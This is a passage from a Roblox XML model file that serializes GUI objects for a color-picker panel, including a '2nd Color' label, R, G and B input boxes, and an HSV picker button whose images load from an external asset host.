													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXBA3224D2D5CA49FEB0A5AF2A5DA55390">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">16</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBXC488CC6FB91E45568EC62F385E70C32B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SecondColorOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>45</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX1C232F1999F34873BC576A3DE500F234">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>40</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">2nd Color</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXAAD11E023E2749608520987A7D2F95E2">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX0C1467F3943E419DB99187564F8EF57F">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXD9D7A2F2824A4889A83530837546A154">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX1705AAAC2F6B4C1DB1B465FDC9653B2E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294901760</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX7CE09E3EC9544706B0C15AF1BDE9DF91">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXEE909837A24548E2A2D815BE91C8613C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">GInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>72</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXC18F24B157724694970280A81C0A1B8B">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXCD497E0DCF404848BE7EE10E62B8CD1A">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX0EB9F2837B8A4C0598BA2DF850E41AB7">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278255360</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX3840B62E6BD64DD1B39ABB6222E58C73">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXBD729C32CEFC42CBACAF3EF634E7F5BC">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">BInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>109</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXB83B854763024FFC8BCB6E7B70E351C8">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXC0EE67FF8ADF44749F70A99AE110BDAD">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX80847F5D585746ACB2F48F9EA98A4828">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190335</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX90E2E33E72C3421CA06352F4D5F82AF5">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="ImageButton" referent="RBX78088DEFAD10475FBDDDDF5EC4164C4C">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">true</bool>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.400000006</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<bool name="Modal">false</bool>
												<string name="Name">HSVPicker</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>160</XO>
													<YS>0</YS>
													<YO>-2</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>27</XO>
													<YS>0</YS>
													<YO>27</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
